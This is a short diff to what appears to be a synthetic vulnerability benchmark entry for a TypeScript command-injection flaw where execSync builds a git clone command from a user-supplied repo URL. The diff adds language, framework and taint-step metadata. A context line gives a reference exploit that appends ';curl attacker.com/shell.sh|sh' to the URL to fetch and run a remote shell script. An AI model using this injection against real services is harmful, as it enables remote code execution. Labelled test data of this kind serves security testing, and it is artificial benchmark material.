@@ -18,3 +18,6 @@ exploitable: true
 reference_exploit: "POST /clone with repo=https://x.com/r.git;curl attacker.com/shell.sh|sh chains RCE"
 reference_fix_commit: null
 notes: "Hand-crafted synthetic. execSync() with template literal. Common in CI/CD tooling where repo URLs are user-provided. Fix: use execFileSync('git', ['clone', repo])."
+language: typescript
+framework: general
+taint_step_count: 3
